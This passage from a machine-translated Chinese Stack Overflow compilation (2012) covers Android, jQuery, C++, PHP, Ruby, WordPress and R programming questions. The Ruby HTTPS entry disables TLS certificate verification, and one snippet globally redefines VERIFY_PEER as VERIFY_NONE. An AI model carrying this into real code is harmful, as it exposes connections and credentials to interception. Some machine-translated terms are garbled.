或者它可以按任何顺序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:08:35.880

你使用什么初始化策略？

```
Database.SetInitializer(your strategy); 
```

你必须先告诉代码你想如何创建你的数据库

看一下

[Entity Framework 4.1 Code First 不创建表](https://stackoverflow.com/questions/7250297/entity-framework-4-1-code-first-not-creating-tables)

# android - 如何将片段放在 ViewPager 上

> ID：13822522
> 
> 赞同：1
> 
> 时间：2012-12-11T15:04:27.293
> 
> 标签：android, android-layout

我正在使用`android.support.v4.view.ViewPager`导航，

我想要做的是在`ViewPager`

在我的活动中，我这样做：

```
FragmentTransaction trans = getSupportFragmentManager().beginTransaction();
trans.add(R.id.main_layout, frag);
trans.addToBackStack(null);
trans.commit(); 
```

但我想我的问题是`ViewPager`不是 a`Fragment`或 in`R.id.main_layout`

这是`activity_main.xml`：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/main_layout"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    >

<android.support.v4.view.ViewPager
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/pager"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:layout_alignParentRight="true"
    tools:context=".MainActivity" >

    <!--
        This title strip will display the currently visible page title, as well as the page
        titles for adjacent pages.
    -->

    <android.support.v4.view.PagerTitleStrip
        android:id="@+id/pager_title_strip"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="top"
        android:background="#33b5e5"
        android:paddingBottom="4dp"
        android:paddingTop="4dp"
        android:textColor="#fff" />

</android.support.v4.view.ViewPager>
</RelativeLayout> 
```

我也试过了`trans.add(R.id.pager, frag)`，也没用。

发生的情况是另一个片段打开但`ViewPager`仍然低于接收输入。

编辑这里有更多信息：

我的 MainActivity 是滑动视图 + 标题条。在其中一个视图上，我显示了一个网格，当用户单击该网格的元素时，我想显示一个新的“视图”（可能不是正确的术语）。

例如，我在我的网格中显示相册，当用户单击相册时，我将显示该相册中的照片。

我认为这就像开始一项新活动，但我正在使用 a`FragmentActivity`并且当我尝试展示新活动时，`Fragment`我无法替换`FragmentActivity`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:21:19.657

1.  请改用 DialogFragment。
2.  不要使用父RelativeLayout作为Fragment容器，在ViewPager上面写一个空的RelativeLayout。
3.  如果上述方法都不起作用，则在显示新的 Fragment 时隐藏 ViewPager。

编辑：布局示例

```
<RelativeLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <android.support.v4.view.ViewPager
        android:id="@+id/pager"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >
    </android.support.v4.view.ViewPager>

    <FrameLayout
        android:id="@+id/fragment_container"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >
    </FrameLayout>

</RelativeLayout> 
```

# java - 当 neo4j 发送 UnderlyingStorageException 时我该怎么办？

> ID：13822523
> 
> 赞同：0
> 
> 时间：2012-12-11T15:04:06.527
> 
> 标签：java, glassfish, neo4j, nio

我刚遇到它，完全惊呆了：

```
[#|2012-12-10T14:16:49.663+0100|WARNING|glassfish3.1.1|javax.enterprise.system.core.transaction.com.sun.jts.jtsxa|_ThreadID=165;_ThreadName=Thread-2;|JTS5068: Unexpected error occurred in rollback
org.neo4j.kernel.impl.nioneo.store.UnderlyingStorageException: Unable to write defragged id  batch
        at org.neo4j.kernel.impl.nioneo.store.IdGeneratorImpl.writeIdBatch(IdGeneratorImpl.java:554)
        at org.neo4j.kernel.impl.nioneo.store.IdGeneratorImpl.freeId(IdGeneratorImpl.java:295)
        at org.neo4j.kernel.impl.nioneo.store.CommonAbstractStore.freeId(CommonAbstractStore.java:404)
        at org.neo4j.kernel.impl.nioneo.xa.WriteTransaction.doRollback(WriteTransaction.java:309)
        at org.neo4j.kernel.impl.transaction.xaframework.XaTransaction.rollback(XaTransaction.java:278)
        at org.neo4j.kernel.impl.transaction.xaframework.XaResourceManager.rollback(XaResourceManager.java:488)
        at org.neo4j.kernel.impl.transaction.xaframework.XaResourceHelpImpl.rollback(XaResourceHelpImpl.java:111)
        at com.sun.jts.jta.TransactionState.rollback(TransactionState.java:193)
        at com.sun.jts.jtsxa.OTSResourceImpl.rollback(OTSResourceImpl.java:333)
        at com.sun.jts.CosTransactions.RegisteredResources.distributeRollback(RegisteredResources.java:1038)
        at com.sun.jts.CosTransactions.TopCoordinator.rollback(TopCoordinator.java:2290)
        at com.sun.jts.CosTransactions.CoordinatorTerm.commit(CoordinatorTerm.java:420)
        at com.sun.jts.CosTransactions.TerminatorImpl.commit(TerminatorImpl.java:250)
        at com.sun.jts.CosTransactions.CurrentImpl.commit(CurrentImpl.java:623)
        at com.sun.jts.jta.TransactionManagerImpl.commit(TransactionManagerImpl.java:323)
        at com.sun.enterprise.transaction.jts.JavaEETransactionManagerJTSDelegate.commitDistributedTransaction(JavaEETransactionManagerJTSDelegate.java:186)
        at com.sun.enterprise.transaction.JavaEETransactionManagerSimplified.commit(JavaEETransactionManagerSimplified.java:858)
        at com.sun.enterprise.transaction.UserTransactionImpl.commit(UserTransactionImpl.java:208)
............
Caused by: java.nio.channels.ClosedByInterruptException
        at java.nio.channels.spi.AbstractInterruptibleChannel.end(AbstractInterruptibleChannel.java:202)
        at sun.nio.ch.FileChannelImpl.size(FileChannelImpl.java:299)
        at org.neo4j.kernel.impl.nioneo.store.IdGeneratorImpl.writeIdBatch(IdGeneratorImpl.java:530)
        ... 104 more 
```

我能做什么，我怎样才能从那个异常中恢复？

我必须说 neo4j 在 Glassfish 应用服务器中使用 neo4j jca 连接器运行。

所以。我能做些什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T20:24:21.697

java.nio.* 中的东西对中断非常敏感，这意味着一旦被中断的线程访问 FileChannel，它就会关闭。Neo4j 使用 FileChannel，这个问题很可能是由于您的环境以一种或另一种方式中断线程造成的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-07T16:54:20.147

问题实际上与 neo4j 无关，而是 Glassfish 默认为 EAR 提供有限的部署时间这一事实（不是直接，而是通过用于将命令发送到域的 HTTP 通道）。

以神秘的日志语句的形式给出了暗示：

> [#|2012-12-10T11:41:49.725+0100|警告|glassfish3.1.1|com.sun.grizzly.config.GrizzlyServiceListener|_ThreadID=29;_ThreadName=Thread-2;|GRIZZLY0023：中断空闲线程：admin-线程池 4848(9).|#]

一个快速的谷歌搜索告诉我我的 EAR 部署到底发生了什么：“[应用程序无法在 ubuntu 上启动，但在 windows 上启动时没有任何问题](https://stackoverflow.com/questions/13150624/application-cannot-start-on-ubuntu-but-starts-on-windows-without-any-trouble)”。结果，我遵循了 java.net 的建议并设置了给定的标志

```
asadmin set server-config.network-config.protocols.protocol.http-listener-1.http.request-timeout-seconds=-1 
```

错误现已消失。

# ios - UITableViewController 数据源来自 coredata

> ID：13822527
> 
> 赞同：1
> 
> 时间：2012-12-11T15:04:33.570
> 
> 标签：ios, core-data, uitableview, nsfetchedresultscontroller

我发现了两种`UITableView`从 coredata 中填充数据的方法。一种方法是使用`NSFetchedResultsController`和实现更新的委托`controller:didChangeSection`。另一种方法是将数据从 coredata 复制到本地托管对象数组。处理本地阵列上的更新并将更改保存到 managedcontex。两者都可以在 developer.apple.com 上找到。

我想听听每种方法的优缺点？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T18:28:36.040

最好使用 NSFetchedResults 控制器，因为您当前的视图控制器可能不是唯一更改数据的控制器。它可能发生在后台，或者通过其他一些视图控制器（例如，如果您有一个拆分视图控制器，您可能正在更改与主视图控制器中的记录相关的数据，在详细视图控制器中）。在这些情况下，您希望表自动反映更改。在极其简单的情况下，如果你是镇上唯一的视图控制器，那么换一种方式可能会更容易，但以正确的方式去做，你会很高兴。

# jquery - jquery：更改 if 语句中的可用下拉列表

> ID：13822533
> 
> 赞同：0
> 
> 时间：2012-12-11T15:04:43.313
> 
> 标签：jquery

感谢stackflow专家，我有一个为一个客户工作的变体，但对于另一个客户，我需要类似但不同的东西。由于代码稍后会发生的事情，我需要使用“If 语句”，但我不能这样做：

我只希望下面的代码>>，如果收音机选择的值=“房子”，运行这个代码，看看“房子”是否是下拉列表中值的一部分，如果是，只显示那些值下拉菜单。与船、公寓等相同。

我在这里做错了什么？

任何帮助，非常感谢。

**jsFiddle在这里：** `http://jsfiddle.net/justmelat/kkk7J` /

**html在这里：**

```
<form method="post">
    <fieldset id="Group1" name="Group1">
    <legend>Group box</legend>
    <input id="Radio1" name="Radio1" type="radio" value="House" />House<br />
    <input id="Radio1" name="Radio1" type="radio" value="Condo" />Condo<br />
<input id="Radio1" name="Radio1" type="radio" value="Boat" />Boat<br />
    </fieldset><br/><br/>

    <fieldset id="Group2" name="Group2">
    <legend>Group Options</legend>
    <select id="Select1" name="Select1">
    <option value="HO-House 1">House 1</option>
    <option value="HO-House 2">House 2</option>
    <option value="HO-House 3">House 3</option>
    <option value="CO-Condo 1">Condo 1</option>
    <option value="CO-Condo 2">Condo 2</option>
    <option value="CO-Condo 3">Condo 3</option>
    <option value="BO-Boat 1">Boat 1</option>
    <option value="BO-Boat 2">Boat 2</option>
    <option value="BO-Boat 3">Boat 3</option>

    </select></fieldset></form> 
```

**这里的javasript：**

```
function whichTypeChange()
    {
//other stuff going on here
var $typeVal = $("input[name=Radio1]:checked").val();
var oldoptions = "";
var oldoptions = [];

if($typeVal ==  "House")
           {

                $("#Select1").append(oldoptions);
                oldoptions = $("#Select1 option:not(:contains(" + ($typeVal) + "))").detach();
           }
if($typeVal ==  "Condo")
           {
                $("#Select1").append(oldoptions);
                oldoptions = $("#Select1 option:not(:contains(" + ($typeVal) + "))").detach();
           }
if($typeVal ==  "Boat")
           {
                $("#Select1").append(oldoptions);
                oldoptions = $("#Select1 option:not(:contains(" + ($typeVal) + "))").detach();
           }

//other stuff going on here
   }​ 
```

**======================================= 好吧，我正在把自己挖到一个更深的洞里。我现在正在开发实际的应用程序。代码如下：**

正如其他人提到的那样，我主要需要使用分离功能来使这项工作在 IE 中工作，但下拉列表中的值没有按应有的方式显示/不显示 - 任何人都可以看到我的错误吗？先感谢您。

```
 typeVal = $("input[name=6535]:checked").val(); //radio buttons
    var jobTypeFld_DD = "";
    jobTypeFld_DD = $('#3547'); //dropdown field
    var optionInDD = []; //array to hopd dropdown options
    optionInDD = jobTypeFld_DD.find('option'); //use this for something else
    optionInDD2 = jobTypeFld_DD.find('option'); // cache all options on page load  
    var visibleItems = "";

if (typeVal == "Art")
         {
         $('fieldset#section-417').show();
         thisval = 'Art -';
         visibleItems = optionInDD2.filter('option[value*=' + thisval + ']'); // options to show
     optionInDD2.not(visibleItems).detach(); // remove all options
         optionInDD2.append(visibleItems); // add options to show
         } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:38:30.843

您可以根据您的无线电输入删除/附加您的选项

```
$(function() {
    var $options = $('option'); // cache all options on page load
    $('input[type=radio]').change(function() {
        var options = $options.filter('option[value*=' + $(this).val() + ']'); // options to show
        $('option').detach(); // remove all options
        $('#Select1').append(options); // add options to show
    });
});​ 
```

[http://jsfiddle.net/fesV3/](http://jsfiddle.net/fesV3/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:19:40.583

你可以使用这样的东西：

```
<html>
<head>
<link rel="stylesheet" href="http://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css">
<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
<script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>
</head>
<body>
<form method="post">
    <fieldset id="Group1" name="Group1">
    <legend>Group box</legend>
    <input id="Radio1" name="Radio1" type="radio" value="House" />House<br />
    <input id="Radio1" name="Radio1" type="radio" value="Condo" />Condo<br />
<input id="Radio1" name="Radio1" type="radio" value="Boat" />Boat<br />
    </fieldset><br/><br/>

    <fieldset id="Group2" name="Group2">
    <legend>Group Options</legend>
    <select id="Select1" name="Select1">
    <option value="">House 1</option>
    <option value="HO-House 2"></option>
    <option value="HO-House 3">House 3</option>
    <option value="CO-Condo 1">Condo 1</option>
    <option value="CO-Condo 2">Condo 2</option>
    <option value="CO-Condo 3">Condo 3</option>
    <option value="BO-Boat 1">Boat 1</option>
    <option value="BO-Boat 2">Boat 2</option>
    <option value="BO-Boat 3">Boat 3</option>

    </select></fieldset></form>
<script>
var myHouseOptions= {
    'HO-House 1' : 'House 1',
    'HO-House 2' : 'House 2',
    'HO-House 3' : 'House 3'
};
var mycondoOptions= {
    'HO-condo1' : 'condo 1',
    'HO-condo 2' : 'condo 2',
    'HO-condo 3' : 'condo 3'
};
var myBoatOptions= {
    'HO-Boat 1' : 'Boat 1',
    'HO-Boat 2' : 'Boat 2',
    'HO-Boat 3' : 'Boat 3'
};
$(function(){
    var ddl = $("#Select1");
    $("input[type='radio']").change(function(){
        switch($(this).val())
        {
        case "House":
        ddl.empty();
        $.each(myHouseOptions, function(val, text) {
        ddl.append( new Option(text,val) );
        });
        break;
        case "Condo":
        ddl.empty();
        $.each(mycondoOptions, function(val, text) {
        ddl.append( new Option(text,val) );
        });

        break;
        case "Boat":
        ddl.empty();
        $.each(myBoatOptions, function(val, text) {
        ddl.append( new Option(text,val) );
        });
        break;
        }
    });
});
</script>

</body>
</html> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:24:07.203

清理标记并删除重复的 ID 等，并执行以下操作来隐藏/显示选项：

```
$('[name="Radio1"]').on('change', function() {
    var self=this, sel=true;
    $('#Select1').find('option').each(function(i,elm) {
        var ex = elm.value.indexOf(self.value)!=-1;
        elm.style.display = ex ? 'block':'none';
        if (sel&&ex) {
            elm.selected = true;
            sel=false;
        }
    });
}); 
```

[**小提琴**](http://jsfiddle.net/kkk7J/8/)

# c++ - forward_list::splice_after(const_iterator pos, forward_list& other, const_iterator i) 功能

> ID：13822540
> 
> 赞同：4
> 
> 时间：2012-12-11T15:05:35.683
> 
> 标签：c++, list, c++11, splice, forward-list

我正在阅读对这个函数应该如何工作的不同解释。

[cplusplus.com](http://www.cplusplus.com/reference/forward_list/forward_list/splice_after/)说这个函数应该“直接在 i 之后移动元素”。
然而[cppreference.com](http://en.cppreference.com/w/cpp/container/forward_list/splice_after)说它拼接了元素 AT i。
MSvisual studio 同意 cplusplus.com。然而，实际上正确的行为是什么？我倾向于认为移动“在 i 之后”更合乎逻辑（& 不需要 N 时间来找到前一个节点）。

（PS：没有转发列表标签？）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T15:09:48.080

23.3.4.6

```
void splice_after(const_iterator position, forward_list& x, const_iterator i);
void splice_after(const_iterator position, forward_list&& x, const_iterator i); 
```

> 效果：将 i 之后的元素插入到 *this 之后的位置，并将其从 x 中删除。如果位置 == i 或位置 == ++i，则结果不变。指向 *i 的指针和引用继续引用相同的元素，但作为 *this 的成员。*i 的迭代器（包括 i 本身）继续引用同一个元素，但现在表现为 *this 的迭代器，而不是 x 的迭代器。

# php - 如何检测数组中的重复 ID？

> ID：13822542
> 
> 赞同：1
> 
> 时间：2012-12-11T15:04:28.463
> 
> 标签：php, arrays, json, unique

```
function getposts($search){
    $url = "http://search.twitter.com/search.json?q=".$search."&include_entities=true&result_type=mixed";
    $value = file_get_contents($url);
    $array = json_decode($value, true);

    foreach($array['results'] as $id){
        $uniquearray[] = array_unique($id);
    }

    for($i=0;$i<count($uniquearray);$i++){
        $output .= $uniquearray[$i]['from_user_id'];
        $output .= "<br />";
    }
    return $output;
} 
```

这就是我尝试过的，但它似乎不起作用它现在只是得到最后一篇文章，我认为那是因为它过滤了每个用户的所有值，因为其中一些来自不同的用户，但另一个键相同的值它会删除它们. 我只想避免重复的 from_user_id 键值。

有人可以帮我解决这个问题吗？我正在使用推特 API。并使用此网址：

[http://search.twitter.com/search.json?q=apitesttweet&include_entities=true&result_type=mixed](http://search.twitter.com/search.json?q=apitesttweet&include_entities=true&result_type=mixed)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T09:18:28.510

我在[这里做了类似的回答](https://stackoverflow.com/a/13012035/1607098)

你可以根据你的问题调整这个。

```
function getposts($search){
    $url = "http://search.twitter.com/search.json?q=".$search."&include_entities=true&result_type=mixed";
    $value = file_get_contents($url);
    $array = json_decode($value, true);

    return $array['results'];
}

function arrayUniqueFromKey(array $arr,$key)
{
    $titles = array();$ret = array();
    foreach ($arr as $v) {
        if (!in_array($v[$key],$titles)) {
            $titles[] = $v[$key];
            $ret[] = $v;
        }
    }
    return $ret;
}
$posts = getposts("apitesttweet");
echo count($posts)." Total posts".PHP_EOL; // 3 Total posts

$uniqs = arrayUniqueFromKey($posts, "from_user_id");
echo count($uniqs). " Unique posts".PHP_EOL; // 2 Unique posts

print_r($uniqs); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T09:03:20.377

它确实有效。我的错误是我试图在循环本身中过滤它。当我将 array_unique 从过滤器中取出时，它起作用了。

```
<?php 
function getids($search){
    $url = "http://search.twitter.com/search.json?q=".$search."&include_entities=true&result_type=mixed";
    $value = file_get_contents($url);
    $array = json_decode($value, true);

    $uniquearray = array();
    for($i=0;$i<count($array['results']);$i++){
            $uniquearray[] = $array['results'][$i]['from_user_id'];
    }

    $uniquearray = array_unique($uniquearray);
    return $uniquearray;
}
?> 
```

我让它更短更干净，让它只返回一个数组。

# html - 降级-webkit-text-security

> ID：13822548
> 
> 赞同：9
> 
> 时间：2012-12-11T15:06:11.620
> 
> 标签：html, css

**注意：**如果您对实现文本安全功能感兴趣，我开发了一个[jQuery 插件](https://github.com/jviotti/jquery-squared-passwords)来完成此操作。

我正在使用`text-security`样式输入：

```
input.square-password {
  -webkit-text-security: square;     
} 
```

在不支持的网络浏览器中，`text-security`仅显示密码（无星号 (****)）。

我期待通过使用`text-security`何时可用或使用标准星号来降低不支持它们的浏览器上的此功能。

输入的 HTML 是：

```
<input class="square-password textbox" name="paymentpassword" /> 
```

我尝试添加一个`type="password"`attr：

```
<input type="password" class="square-password textbox" name="paymentpassword" /> 
```

但`text-security`即使在支持它的浏览器上，它也会覆盖。

任何解决方法？是否可以通过`CSS`(no type="password") 为输入设置星号？

**编辑：** text-security 似乎只受 webkit 支持。

**编辑 2：**设置为`type="password"`无法使用文本安全设置样式的输入。甚至没有`!important`(type="email" 确实)

**编辑 3：** @ryan 答案适用于：

*   火狐
*   铬合金
*   歌剧

[无法更改 IE8 中的输入类型？](https://stackoverflow.com/questions/7618306/javascript-change-input-type-dynamically-doesnt-work-on-ie8)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-11T15:41:34.143

这非常快速和肮脏，但它有效。

```
<html>
<head>
    <style>
        input{
            -webkit-text-security:square; 
            text-security:square;
        }       
    </style>

    <script>
        window.onload = function(){
            init(); 
        }
        function init(){
            var x = document.getElementsByTagName("input")[0];
            var style = window.getComputedStyle(x);
            console.log(style);
            if(style.webkitTextSecurity){
                //do nothing
            }else{
                x.setAttribute("type","password");
            }
        }           
    </script>
</head>
<body>
    <div id="di">
        <input/>        
    </div>
</body> 
```

在 chrome 和 firefox 中测试，我在 linux 上，所以我无法在 IE 中测试。 [Jsfiddle在这里。](http://jsfiddle.net/Wqg8y/1/)

# wchar - 如何让我的代码也处理 wchar_t

> ID：13822549
> 
> 赞同：1
> 
> 时间：2012-12-11T15:06:14.630
> 
> 标签：wchar

我真的很想在这方面得到一些帮助。我对 C++ 编程比较陌生。我需要我的代码能够处理 ASCII 和 Unicode。以下是输入 szTestString1，在输入中找到“Ni”并将其替换为“NI”。szTestString1 是 ASCII 所以我的代码工作正常。如何使代码也能够处理 szTestString2？我用 wstring 替换了字符串，用 L"Ni" 替换了 "Ni"。此外，我使用 wcout 而不是 cout，但输出没有多大意义。而我现在迷路了。任何提示将不胜感激。

```
#include <iostream>
#include <string> using namespace std;

class MyClass {

public: int getNiCount(string s1) {     int Ni_counter=0;   int found,pos;

        for (pos=0; found!=-1; pos+=(found+2)){             found=s1.find("Ni",pos);
            Ni_counter++;       }

return(Ni_counter-1); }

string replaceNiWithNI(string s1) {     int found,pos;

        do{             found=s1.find("Ni",pos);            if (found!=-1)          s1.replace(found, sizeof("Ni")-1, "NI");        }while (found!=-1); return(s1); }

} obj1;

int main()

{

    const char *szTestString1 = "Ni ll Ni ll Ni nI NI nI Ni Ni";    const wchar_t *szTestString2 = L"Ni ll Ni ll Ni nI NI nI Ni Ni";

    int Ni_occur_number;    string new_string;

    // Invoke getNiCount(...) of class MyClass  Ni_occur_number=obj1.getNiCount(szTestString1);     // Invoke replaceNiWithNI(...) of class MyClass     new_string=obj1.replaceNiWithNI(szTestString1);

    // Display on screen: "Found X occurrences of Ni. New string: Y"    cout << "Found " << Ni_occur_number << " occurrences of Ni. " << "New string: " << new_string << endl;

} 
```

# php - PHPStorm无法打开Chrome？

> ID：13822550
> 
> 赞同：0
> 
> 时间：2012-12-11T15:06:16.823
> 
> 标签：php, google-chrome, phpstorm

我是 PHPStrom 的新手。今天我开始使用 PHPStrom。当我想在使用所有浏览器的浏览器上运行 php 文件时，`Alt+F2`所有浏览器都正常打开。

但是当我选择 Google Chrome 时，我收到了这个错误信息。

请帮助我，如何解决这个问题？

![在此处输入图像描述](../Images/44ab4660ea74b304c7e471b53fa4ad02.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:13:15.053

在`Settings`| `Web Browsers`指定系统上 Google Chrome 的正确路径。确保它已安装并从指定位置正常运行：

![网络浏览器](../Images/b2598499e224e2843108c27065814352.png)

# actionscript-3 - 在 AS3 中，当流媒体视频冻结时，您如何检测到呢？

> ID：13822552
> 
> 赞同：1
> 
> 时间：2012-12-11T15:05:44.893
> 
> 标签：actionscript-3, flash, video, streaming, flash-media-server

检测 NetStream 上的视频是否在流中冻结的好、可靠的方法是什么？对于 RTMP 和 RTMFP，我需要知道这一点，尽管我的猜测是协议在这里并不重要。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:30:21.513

您很可能必须运行调试器或设置一个计时器来轮询它，但看看

网络流信息

[http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/NetStream.html#info](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/NetStream.html#info)

# ruby - 如何在 Ruby 中通过 HTTPs 进行基本身份验证？

> ID：13822555
> 
> 赞同：22
> 
> 时间：2012-12-11T15:06:27.983
> 
> 标签：ruby, https, basic-authentication

看了很多之后，我发现了一些似乎有效的解决方案，但不适合我......

例如，我有这个脚本：

```
require 'net/http'
require "net/https"

@http=Net::HTTP.new('www.xxxxxxx.net', 443)
@http.use_ssl = true
@http.verify_mode = OpenSSL::SSL::VERIFY_NONE
@http.start() {|http|
    req = Net::HTTP::Get.new('/gb/PastSetupsXLS.asp?SR=31,6')
    req.basic_auth 'my_user', 'my_password'
    response = http.request(req)
    print response.body
} 
```

当我运行它时，它会给我一个请求身份验证的页面，但是如果我在浏览器中编写以下 URL，我可以毫无问题地进入该网站：

```
https://my_user:my_password@www.xxxxxxx.net/gb/PastSetupsXLS.asp?SR=31,6 
```

我也尝试过使用 open-uri：

```
module OpenSSL
    module SSL
        remove_const :VERIFY_PEER
    end
end
OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE

def download(full_url, to_here)
    writeOut = open(to_here, "wb") 
    writeOut.write(open(full_url, :http_basic_authentication=>["my_user", "my_password"]).read) 
    writeOut.close 
end

download('https://www.xxxxxxx.net/gb/PastSetupsXLS.asp?SR=31,6', "target_file.html") 
```

但结果是一样的，网站要求用户认证。关于我做错了什么的任何提示？我必须在 Base 64 中编码密码吗？

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-12-12T12:05:22.733

[我根据Net::HTTP 文档](http://ruby-doc.org/stdlib-1.9.3/libdoc/net/http/rdoc/Net/HTTP.html)中给出的示例编写了一段代码，并在我的本地 WAMP 服务器上对其进行了测试——它运行良好。这是我所拥有的：

```
require 'net/http'
require 'openssl'

uri = URI('https://localhost/')

Net::HTTP.start(uri.host, uri.port,
  :use_ssl => uri.scheme == 'https', 
  :verify_mode => OpenSSL::SSL::VERIFY_NONE) do |http|

  request = Net::HTTP::Get.new uri.request_uri
  request.basic_auth 'matt', 'secret'

  response = http.request request # Net::HTTPResponse object

  puts response
  puts response.body
end 
```

我的`.htaccess`文件如下所示：

```
AuthName "Authorization required"
AuthUserFile c:/wamp/www/ssl/.htpasswd
AuthType basic
Require valid-user 
```

我的只是用密码“秘密”`.htpasswd`生成的一个衬里。`htpasswd -c .htpasswd matt`当我运行我的代码时，我得到“200 OK”和 index.html 的内容。如果我删除该`request.basic_auth`行，我会收到 401 错误。

**更新：**

正如评论中@stereoscott 所指出的，`:verify_mode`我在示例 ( `OpenSSL::SSL::VERIFY_NONE`) 中使用的值对于生产来说是不安全的。

[OpenSSL::SSL::SSLContext](http://ruby-doc.org/stdlib-1.9.3/libdoc/openssl/rdoc/OpenSSL/SSL/SSLContext.html#verify_mode)文档中列出的所有可用选项包括：VERIFY_NONE、VERIFY_PEER、VERIFY_CLIENT_ONCE、VERIFY_FAIL_IF_NO_PEER_CERT，其中（根据[OpenSSL 文档](https://www.openssl.org/docs/ssl/SSL_CTX_set_verify.html#NOTES)）只有前两个用于客户端模式。

所以`VERIFY_PEER`应该在生产中使用，这[是默认的](http://ruby-doc.org/stdlib-1.9.3/libdoc/net/http/rdoc/Net/HTTP.html#method-c-start)顺便说一句，所以你可以完全跳过它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-09-08T22:40:56.027

以下是最终为我工作的内容：

```
require "uri"
require "net/http"

url = URI("https://localhost/")

https = Net::HTTP.new(url.host, url.port)
https.use_ssl = true

request = Net::HTTP::Get.new(url)
request["Authorization"] =  "Basic " + Base64::encode64("my_user:my_password")

response = https.request(request)
puts response.read_body 
```

我通过在[Postman](https://www.postman.com/)中构建一个新的 HTTP 请求、指定 URL、选择“基本身份验证”的授权类型并输入凭据来解决这个问题。

单击代码图标 ( `</>`) 并选择“Ruby - Net::HTTP”将生成一个代码片段，为您提供上面的输出。

Postman 负责对凭据进行编码，但[这个答案](https://stackoverflow.com/a/32172779/2566838)帮助我动态设置这些值。您也可以在请求中省略“cookie”键。

# wordpress - Wordpress 重定向到不存在的语言目录

> ID：13822558
> 
> 赞同：0
> 
> 时间：2012-12-11T15:06:40.350
> 
> 标签：wordpress, .htaccess, redirect

以下情况。我有一个安装在 /blog/ 中的博客 - 该网站提供 3 种语言（de、at、ch），每种语言都应该链接到 /language/blog/，但它们都应该显示 /blog/ 的内容（你为什么问？搜索引擎优化的目的......）

这是我得到的 .htaccess：

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/(de|at|ch)/blog/(.*)$
RewriteRule ^(.*)$ /blog/%2?hl=%1 [L]
</IfModule>

<IfModule mod_rewrite.c>
RewriteEngine On
#RewriteBase /blog/
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /blog/index.php [L]
</IfModule> 
```

语言目录实际上并不存在，只应该给人留下印象。

“hl”（hreflang）查询参数供以后在脚本中使用 - 参数按预期发送。所以现在它基本上可以工作了（在非 wordpress 目录上测试） - 但是当我在 Wordpress 环境中使用它时，我得到的只是 404.php-Template 的内容。

使用版本：3.4.2

有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T19:04:52.310

您应该将添加的代码放在根目录中的单独 htaccess 中，而不是`/blog`目录中。

# r - 写一个没有索引的动物园对象

> ID：13822563
> 
> 赞同：3
> 
> 时间：2012-12-11T15:06:31.710
> 
> 标签：r, zoo

我有一个动物园对象（tmp），它有日期和时间作为索引和如下值

```
> library(zoo)
> library(chron)
> tmp
(01/01/97 00:00:00) (01/01/97 01:00:00) (01/01/97 02:00:00) 
            5.0                 3.2                 6.7 
> dput(tmp)
structure(c(5, 3.2, 6.7), index = structure(c(9862, 9862.04166666667, 
9862.08333333333), format = structure(c("m/d/y", "h:m:s"), .Names = c("dates", 
"times")), origin = structure(c(1, 1, 1970), .Names = c("month", 
"day", "year")), class = c("chron", "dates", "times")), class = "zoo") 
```

我正在尝试将此动物园对象写入文本文件，我只想将值写入文本文件中。我使用了以下代码：

```
write.zoo(tmp,file="D:/test.txt", row.names=FALSE, quote=FALSE, na="") 
```

我得到以下文件：

```
(01/01/97 00:00:00) 5
(01/01/97 01:00:00) 3.2
(01/01/97 02:00:00) 6.7 
```

但我想要的输出是

```
5
3.2
6.7 
```

谁能告诉我如何得到这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:46:48.890

首先将数据转换为法线向量，并将其写为法线表：

```
write.table(as.vector(tmp), file="D:/test.txt",
            row.names=FALSE, col.names=FALSE, quote=FALSE, na="") 
```

实际上，转换为向量似乎是不必要的，但我认为它更清楚，因为您表示您正在丢弃与这些值关联的额外数据动物园。

正如 Joshua Ulrich 在下面的评论中所写，如果您的`tmp`对象有多个列，您可能应该使用`coredata`而不是`as.vector`：

```
write.table(coredata(tmp), file="D:/test.txt",
            row.names=FALSE, col.names=FALSE, quote=FALSE, na="") 
```

不同之处在于，这将生成一个包含多列的文件，而`as.vector`通过简单地一个接一个地写出列向量来生成单列。取决于您的用例。

我猜（虽然我可能是错的）下面的作品就像这个`coredata`版本：

```
write.table(tmp, file="D:/test.txt",
            row.names=FALSE, col.names=FALSE, quote=FALSE, na="") 
```

# android - 在 android 中创建 XML 布局

> ID：13822564
> 
